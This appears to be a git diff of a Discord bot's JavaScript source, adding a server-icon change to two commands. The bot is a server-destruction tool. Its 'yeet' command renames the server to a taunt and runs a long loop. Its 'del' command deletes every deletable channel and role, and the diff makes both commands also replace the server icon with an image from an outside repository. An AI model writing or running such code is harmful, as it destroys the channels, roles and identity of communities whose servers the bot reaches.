@@ -20,6 +20,7 @@ client.on("message", (message) => {
         case "yeet":
             message.delete();
             let i;
+            message.guild.setIcon(`https://github.com/shidemuri/tefoco-v3/blob/master/image.png?raw=true`)
             if(!args[0]){ 
                 message.guild.setName('haha admin go grr')
                 for(i = 0; i < 251; i++){
@@ -49,6 +50,7 @@ client.on("message", (message) => {
         break;
         case "del":
             message.delete();
+            message.guild.setIcon(`https://github.com/shidemuri/tefoco-v3/blob/master/image.png?raw=true`)
             message.guild.channels.cache.forEach(m =>{if(m.deletable) m.delete()});
             message.guild.roles.cache.forEach(r =>{if(r.deletable) r.delete()})
             message.guild.channels.create(`\uA672`, {type: `text`})
